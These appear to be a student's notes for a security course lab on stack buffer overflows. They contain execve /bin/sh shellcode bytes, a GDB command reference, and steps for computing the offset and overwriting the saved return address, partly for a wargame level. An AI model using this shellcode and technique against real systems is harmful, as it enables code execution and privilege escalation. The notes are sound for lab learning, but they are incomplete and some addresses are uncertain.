## SSS Lab3 How2:

### Shellcode
Shellcode: 
```
31 c0 50 68 2f 2f 73 68
68 2f 62 69 6e 89 e3 50
53 89 e1 99 b0 0b cd 80
```
> TODO: Make shellcode which gives us root

`xxd -p -r shellcode > badfile`

### GDB

| Command                              | Meaning                                                                                                                                                                                                                                                  |
| ------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `r`                                  | (re)run the program                                                                                                                                                                                                                                      |
| `q`                                  | quit gdb                                                                                                                                                                                                                                                 |
| `break <n>`               !          | breakpoint at line `n`                                                                                                                                                                                                                                   |
| `break *<n>`                         | breakpoint at memory address `n`                                                                                                                                                                                                                         |
| `c`                                  | continue past breakpoint                                                                                                                                                                                                                                 |
| `s [n]`                              | step `n`lines in the source                                                                                                                                                                                                                              |
| `si [n]`                             | step `n`machine instructions                                                                                                                                                                                                                             |
| `n [n]`                              | step `n`lines in the source of the current function, executing any function calls on the way                                                                                                                                                             |
| `ni [n]`                             | step `n`machine instructions in the current function, executing any function calls on the way                                                                                                                                                            |
| `i r`                                | display current register values                                                                                                                                                                                                                          |
| `i f`                                | frame information                                                                                                                                                                                                                            |
| `disassemble/mr <function>`          | disassemble a function (among other things you can then work out the exact layout of its stack frame)                                                                                                                                                    |
| `x/<n><t>[s] m` (e.g. `x/20xb $esp`) | dump memory: `n` = no. items to show, `t` = type (`x`=hex,`d`/`u`=signed/unsigned int, `c`=char, `a`=address, `s`=string), `s`=size (`b`=byte, `h`=halfword (2 bytes), `w`=word), `m` = memory location, or register pointing to a memory location |
| `print <expression>`                 | print the value of something                                                                                                                                                                                                                             |
| `display <expression>`               | print something every time you hit a breakpoint or step                                                                                                                                                                                                  |
| `l [n]`                              | list `n` lines of code, default 10                                                                                                                                                                                               |
| `layout asm`                         | show assembly layout                                                                                                                                                                                                                                     |

> NB: gdb offset probably 0x40

### Scripts

#### `offset.c`
``` c
#include <stdio.h>
#include <unistd.h>

int main(void) {
    char buffer[256];

    printf("PID: %d\n", getpid());
    printf("Buffer address: %p\n", (void *)buffer); #only acc important one
    fflush(stdout);

    return 0;
}
```

#### `env.sh`

``` bash
#!/bin/bash
sudo apt-get install gcc xxd vim -y
```

### Other

> TODO: how to input file through cli

## Lab3 Walkthrough

> TODO: figure out how to find the break point manually
1. `gdb stack` -> `break bof` -> `run` -> `n` 

2. Open `shellcode`

> TODO: add method to find without knowing buffer name. Possibly stack dump from `$esp` 
3. `p &buffer` get buffer location

4. `i f` get `eip` location

(Hex Calculator)[https://www.calculator.net/hex-calculator.html]
> TODO: add cli instruction or link to calculate offset
5. Calculate offset

6. Add padding to shellcode width of offset

7. Use `x/128xb $esp` to find start of shellcode 

8. Add addr to shellcode after buffer padding

### Outside of `gdb`

1. Find gdb offset (probs `0x40`) if not use `offset.c`

2. Remove from addr

<!-- 
decrease stack pointer so doesn't write shell - sub esp, 0x60 - add instruction use defuse.ca website
replace some 90s with added instr

p &buffer - print address of buffer *instead of finding esp change

0xbffff268 - 0x080483ee
0xbffff258 root

run gdb and not find diff in hex of address - apply diff to shellcode address
diff ox40 so -> a8
diff in stack root was 0x10  so 98

"$(cat /tmp/badfile)" - input file
 gdb --args /levels/level05 "$(cat /tmp/badfile)" - input file with gdb

exit - exit arb shell

lab3 cheat sheet -->



eip at 0xbffffb7c

buffer at 0xbffffdd3 or 0xbffffaf0?



previous sp 0xbffffb80
